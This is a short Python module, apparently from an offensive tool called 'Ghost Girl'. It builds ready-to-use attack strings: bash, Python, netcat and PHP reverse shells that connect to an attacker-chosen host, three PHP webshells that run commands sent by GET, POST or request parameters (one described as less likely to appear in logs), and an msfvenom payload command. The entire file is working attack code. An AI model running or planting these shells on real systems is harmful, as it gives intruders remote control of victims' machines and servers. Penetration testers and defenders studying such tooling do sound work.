"""Ghost Girl — reverse shell and webshell generators."""


def bash_revshell(lhost, lport):
    """Bash reverse shell one-liner."""
    return f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"


def python_revshell(lhost, lport):
    """Python3 reverse shell one-liner."""
    return (
        f"python3 -c 'import socket,subprocess,os;"
        f"s=socket.socket();s.connect((\"{lhost}\",{lport}));"
        f"os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);"
        f"subprocess.call([\"/bin/bash\",\"-i\"])'"
    )


def nc_revshell(lhost, lport):
    """Netcat reverse shell (with -e)."""
    return f"nc -e /bin/bash {lhost} {lport}"


def nc_mkfifo_revshell(lhost, lport):
    """Netcat reverse shell using mkfifo (works when -e is unavailable)."""
    return (
        f"rm /tmp/f;mkfifo /tmp/f;"
        f"cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f"
    )


def php_revshell(lhost, lport):
    """PHP reverse shell one-liner (for injection contexts)."""
    return (
        f"php -r '$s=fsockopen(\"{lhost}\",{lport});"
        f"exec(\"/bin/bash -i <&3 >&3 2>&3\");'"
    )


def php_webshell():
    """Minimal PHP webshell. Usage: ?cmd=whoami"""
    return '<?php echo shell_exec($_GET["cmd"]); ?>'


def php_webshell_post():
    """POST-based PHP webshell (less likely to appear in logs)."""
    return '<?php if(isset($_POST["cmd"])){echo shell_exec($_POST["cmd"]);} ?>'


def php_system_webshell():
    """PHP webshell using system() for real-time output."""
    return '<?php if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);} ?>'


def msfvenom_cmd(lhost, lport, payload="linux/x64/shell_reverse_tcp", fmt="elf", outfile="shell"):
    """Generate the msfvenom command string (not executed, just the command)."""
    return (
        f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} "
        f"-f {fmt} -o {outfile}"
    )
